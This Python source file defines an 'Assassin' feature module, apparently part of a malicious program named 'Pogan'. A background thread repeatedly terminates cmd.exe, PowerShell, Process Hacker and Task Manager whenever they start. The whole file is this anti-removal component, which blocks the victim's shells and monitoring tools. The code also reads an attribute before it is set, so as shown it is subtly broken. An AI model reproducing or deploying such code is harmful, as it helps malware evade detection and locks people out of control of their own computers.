from psutil import Process, process_iter, NoSuchProcess, AccessDenied, ZombieProcess
from threading import Thread
from time import sleep
from os import getpid

from pogan_feature import PoganFeature

BANNED_PROCESSES = [
    'cmd.exe',
    'powershell.exe',
    'ProcessHacker.exe',
    'Taskmgr.exe'
]


class Assassin(PoganFeature):
    def __init__(self, filename: str, log_dir: str, log=True, processes_to_kill=BANNED_PROCESSES):
        super().__init__("[Process Assassin]", filename, log_dir, log)

        self.kill_order = processes_to_kill
        self.runner_thread = Thread(target=self.hunt_processes)

    def run(self):
        self.logger.write('Started Assassin')
        self.runner_thread.start()

    def clean(self):
        self.logger.write('Stopping Assassin')
        self.kill = True

    def hunt_processes(self):
        while not self.kill:
            for process in process_iter():
                try:
                    if process.name() in self.kill_order and getpid() != process.pid:
                        self.logger.write(f'Killing {process.name()}')
                        Process(process.pid).terminate()
                except (NoSuchProcess, AccessDenied, ZombieProcess):
                    pass

            sleep(1)
